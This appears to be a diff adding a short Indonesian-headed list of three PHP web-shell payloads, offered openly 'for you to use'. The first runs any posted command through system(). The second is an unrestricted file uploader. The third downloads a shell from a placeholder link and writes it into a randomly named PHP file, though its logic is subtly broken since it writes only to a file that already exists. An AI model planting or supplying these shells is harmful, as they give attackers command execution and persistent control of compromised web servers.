@@ -1,0 +1,35 @@
+List payloads yang bisa kalian pakai
+
+Payload 1:
+<?php
+echo "<form method='post'>
+<input type='text' name='cmd' style='width:450px;'>
+<input type='submit' name='go' value='>>'></form>";
+if(isset($_POST['go'])){
+echo "<pre style='background:silver;color:black;'>".system($_POST['cmd'])."</pre>";
+}
+?>
+
+Payload 2:
+<?php
+echo "<form enctype='multipart/form-data' method='post'>
+<input type='file' name='hyaa'>
+<input type='submit' name='go' value='>>'></form>";
+if(isset($_POST['go'])){
+if(@copy($_FILES['hyaa']['tmp_name'], $_FILES['hyaa']['name'])){
+echo "<b>Done</b>";
+}
+else{
+echo "<font color='red'>Fail</font>";
+}
+}
+?>
+
+Payload 3:
+<?php
+$rand=md5(uniqid());$rand=substr($rand,0,5);
+$get=file_get_contents("linkshellkalian");
+if(file_exists($rand.".php")){
+fwrite(fopen($rand.".php","a"),$get);
+}
+?>
